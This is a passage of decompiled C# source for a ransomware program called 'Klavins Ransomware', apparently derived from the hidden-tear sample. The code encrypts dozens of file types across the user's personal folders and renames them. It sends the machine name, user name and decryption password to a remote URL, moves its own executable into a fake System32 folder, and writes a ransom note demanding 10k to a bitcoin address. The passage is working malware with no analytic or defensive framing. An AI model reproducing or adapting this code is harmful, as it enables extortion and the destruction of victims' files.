			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passwordBytes, salt, 1000);
			rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
			rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
			rijndaelManaged.Mode = CipherMode.CBC;
			using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write))
			{
				cryptoStream.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
				cryptoStream.Close();
			}
			result = memoryStream.ToArray();
		}
		return result;
	}

	public string CreatePassword(int length)
	{
		StringBuilder stringBuilder = new StringBuilder();
		Random random = new Random();
		while (0 < length--)
		{
			stringBuilder.Append("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=?()"[random.Next("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=?()".Length)]);
		}
		return stringBuilder.ToString();
	}

	public void SendPassword(string password)
	{
		try
		{
			string text = "?computer_name=" + computerName + "&userName=" + userName + "&password=" + password + "&allow=ransom";
			string address = targetURL + text;
			new WebClient().DownloadString(address);
		}
		catch (Exception)
		{
		}
	}

	public void EncryptFile(string file, string password)
	{
		byte[] bytesToBeEncrypted = File.ReadAllBytes(file);
		byte[] bytes = Encoding.UTF8.GetBytes(password);
		bytes = SHA256.Create().ComputeHash(bytes);
		byte[] bytes2 = AES_Encrypt(bytesToBeEncrypted, bytes);
		string text = "Users\\";
		string text2 = text + userName + "\\Desktop\\READ_IT.txt.locked";
		string path = userDir + text2;
		if (File.Exists(path))
		{
			File.Delete(path);
		}
		File.WriteAllBytes(file, bytes2);
		File.Move(file, file + ".klavins");
	}

	public void encryptDirectory(string location, string password)
	{
		try
		{
			string[] source = new string[72]
			{
				".txt", ".jar", ".exe", ".dat", ".contact", ".settings", ".doc", ".docx", ".xls", ".xlsx",
				".ppt", ".pptx", ".odt", ".jpg", ".png", ".csv", ".py", ".sql", ".mdb", ".sln",
				".php", ".asp", ".aspx", ".html", ".htm", ".xml", ".psd", ".pdf", ".dll", ".c",
				".cs", ".mp3", ".mp4", ".f3d", ".dwg", ".cpp", ".zip", ".rar", ".mov", ".rtf",
				".bmp", ".mkv", ".avi", ".apk", ".lnk", ".iso", ".7-zip", ".ace", ".arj", ".bz2",
				".cab", ".gzip", ".lzh", ".tar", ".uue", ".xz", ".z", ".001", ".mpeg", ".mp3",
				".mpg", ".core", ".crproj", ".pdb", ".ico", ".pas", ".db", ".torrent", ".dll", ".locked",
				".app", ".onyxmods"
			};
			string[] files = Directory.GetFiles(location);
			string[] directories = Directory.GetDirectories(location);
			for (int i = 0; i < files.Length; i++)
			{
				string extension = Path.GetExtension(files[i]);
				if (source.Contains(extension))
				{
					EncryptFile(files[i], password);
				}
			}
			for (int j = 0; j < directories.Length; j++)
			{
				encryptDirectory(directories[j], password);
			}
		}
		catch (Exception)
		{
		}
	}

	public void MoveVirus()
	{
		string path = userDir + userName + "\\System32";
		string text = userDir + userName + "\\server\\local.exe";
		if (!Directory.Exists(path))
		{
			Directory.CreateDirectory(path);
		}
		else if (File.Exists(text))
		{
			File.Delete(text);
		}
		string text2 = "\\" + Process.GetCurrentProcess().ProcessName + ".exe";
		string text3 = Directory.GetCurrentDirectory() + text2;
		string sourceFileName = text3;
		File.Move(sourceFileName, text);
	}

	public static bool CheckForInternetConnection()
	{
		try
		{
			using WebClient webClient = new WebClient();
			using (webClient.OpenRead("https://www.google.com"))
			{
				return true;
			}
		}
		catch
		{
			return false;
		}
	}

	public void startAction()
	{
		string password = CreatePassword(15);
		Directory_Settings_Sending(password);
		string path = userDir + userName + "\\hi.jpg";
		bool flag;
		do
		{
			if (flag = CheckForInternetConnection())
			{
				SetWallpaperFromWeb(backgroundImageUrl, path);
				SendPassword(password);
			}
		}
		while (!flag);
		password = null;
		Application.Exit();
	}

	public void Directory_Settings_Sending(string password)
	{
		string text = "Users\\";
		string location = userDir + text + userName + "\\Desktop";
		string location2 = userDir + text + userName + "\\Links";
		string location3 = userDir + text + userName + "\\Contacts";
		string location4 = userDir + text + userName + "\\Desktop";
		string location5 = userDir + text + userName + "\\Documents";
		string location6 = userDir + text + userName + "\\Downloads";
		string location7 = userDir + text + userName + "\\Pictures";
		string location8 = userDir + text + userName + "\\Music";
		string location9 = userDir + text + userName + "\\OneDrive";
		string location10 = userDir + text + userName + "\\Saved Games";
		string location11 = userDir + text + userName + "\\Favorites";
		string location12 = userDir + text + userName + "\\Searches";
		string location13 = userDir + text + userName + "\\Videos";
		encryptDirectory(location, password);
		encryptDirectory(location2, password);
		encryptDirectory(location3, password);
		encryptDirectory(location4, password);
		encryptDirectory(location5, password);
		encryptDirectory(location6, password);
		encryptDirectory(location7, password);
		encryptDirectory(location8, password);
		encryptDirectory(location9, password);
		encryptDirectory(location10, password);
		encryptDirectory(location11, password);
		encryptDirectory(location12, password);
		encryptDirectory(location13, password);
	}

	public void messageCreator()
	{
		string text = "\\Desktop\\READ_ME.txt";
		string path = userDir + "Users\\" + userName + text;
		_ = computerName + "-" + userName;
		string[] contents = new string[3] { "Your files have been encrypted by the Klavins Ransomware", "pay 10k to this bitcoin address :  13AM4VW2dhxYgXeQepoHkHSQuy6NgaEb94 ", " delete system32 or kebab. - Kape Technologies" };
		File.WriteAllLines(path, contents);
	}

	public void SetWallpaper(string path)
	{
		SystemParametersInfo(20u, 0u, path, 3u);
	}

	private void SetWallpaperFromWeb(string url, string path)
	{
		try
		{
			WebClient webClient = new WebClient();
			webClient.DownloadFile(new Uri(url), path);
			SetWallpaper(path);
		}
		catch (Exception)
		{
		}
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_004d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0057: Expected O, but got Unknown
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Form1));
		((Control)this).SuspendLayout();
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(124, 53));
		((Form)this).set_Icon((Icon)componentResourceManager.GetObject("$this.Icon"));
		((Control)this).set_Name("Form1");
		((Control)this).set_Text("hidden tear");
		((Form)this).add_Load((EventHandler)Form1_Load);
		((Control)this).ResumeLayout(false);
	}
}
